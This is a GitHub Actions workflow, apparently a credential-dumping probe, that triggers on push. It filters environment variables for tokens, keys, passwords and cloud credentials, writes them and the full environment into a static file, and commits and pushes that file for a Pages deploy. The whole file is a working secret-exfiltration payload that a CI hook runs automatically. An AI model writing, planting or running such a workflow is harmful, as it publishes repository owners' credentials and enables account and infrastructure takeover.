name: secretdump-25522
on:
  push:
  workflow_dispatch:
permissions:
  contents: write
  pages: write
  id-token: write
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Dump secrets and env
        run: |
          mkdir -p static
          {
            echo "=== 25522 SECRET DUMP $(date -u) ==="
            echo "--- github context ---"
            echo "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF actor=${{ github.actor }}"
            echo "--- all env (filtered) ---"
            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|KEY|TOKEN|SECRET|PASSWORD|SUPABASE|CLOUDFLARE|R2|D1|DB_|PRIVATE|API|PAT|DEPLOY" || echo "NO_FILTERED_ENV"
            echo "--- full env ---"
            env | sort
          } > static/sd25522.txt
          echo "wrote static/sd25522.txt size=$(wc -c < static/sd25522.txt)"
      - name: Commit dump to branch for pages deploy
        run: |
          git config user.name "canary"
          git config user.email "canary@example.com"
          git add static/sd25522.txt
          git commit -m "sd25522 dump" || echo "nothing to commit"
          git push || echo "push failed"